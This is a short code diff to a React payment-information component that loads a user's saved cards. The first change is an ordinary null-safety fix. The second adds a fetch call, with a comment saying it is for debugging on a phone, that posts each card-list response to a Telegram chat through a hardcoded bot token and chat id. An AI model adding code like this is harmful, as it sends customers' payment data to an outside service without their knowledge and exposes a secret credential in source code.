@@ -28,7 +28,7 @@ const PaymentInfo = () => {
   const [errorAlertProps, setErrorAlertProps] = useState({});
   const userData = useSelector((state) => state.userData?.data);
   const [selectedCardId, setSelectedCardId] = useState(
-    myCards?.at(-1)?.guid || ""
+    Array.isArray(myCards) && myCards.length > 0 ? myCards.at(-1)?.guid || "" : ""
   );
   const [isCardSelectOpen, setCardSelectOpen] = useState(false);
   const [selectedCardIcon, setSelectedCardIcon] = useState(cardicon);
@@ -118,6 +118,18 @@ const PaymentInfo = () => {
     })
       .then((res) => {
         setMyCards(res?.data?.data?.response);
+        console.log("res payment: ", res?.data?.data?.response);
+        // sending response to tg to check the response, as I cannot see console.log in my phone
+        fetch(`https://api.telegram.org/bot5933951945:AAGVK6UU0GhoLrnGDPzQ22V681pYr4j-N5E/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: "1780780393",
+            text: `res payment: ${res?.data?.data?.response}`,
+          }),
+        })
         if (selectedCardId === "") {
           setSelectedCardId(res?.data?.data?.response?.at(-1)?.guid || "");
         }
